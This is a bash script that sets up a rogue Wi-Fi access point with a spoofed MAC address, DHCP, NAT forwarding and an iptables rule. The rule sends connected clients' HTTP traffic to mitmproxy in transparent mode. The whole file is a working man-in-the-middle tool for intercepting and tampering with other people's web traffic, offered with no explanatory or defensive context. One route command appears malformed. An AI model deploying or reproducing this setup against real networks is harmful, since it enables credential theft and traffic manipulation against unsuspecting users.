
#!/bin/bash

echo "Starting access point…"
macchanger -A wlan1
ifconfig wlan1 up
hostapd -B simplemitm-hostapd.conf
sleep 2
ifconfig br0 up
ifconfig br0 10.1.1.1 netmask 255.255.255.0
SUBNET="$(route -n | grep wlan0 | grep -v ^0.0.0.0 | head -n 1 | cut -d ' ' -f 1)"
route add -net $SUBNET net mask 255.255.255.0 gw 10.1.1.1
sysctl net.ipv4.ip_forward=1
iptables --flush
iptables -t nat --flush
iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
iptables -A FORWARD -i br0 -o wlan0 -j ACCEPT
iptables -A FORWARD -i wlan0 -o br0 -j ACCEPT
dhcpd -d -f -cf simplemitm-dhcpd.conf br0 >/dev/null 2>&1 &
echo "Listening for connections..."
sleep 1
echo "Starting mitmproxy..."
iptables -t nat -A PREROUTING -i br0 -p tcp --destination-port 80 -j REDIRECT --to-port 8080
mitmproxy -T --host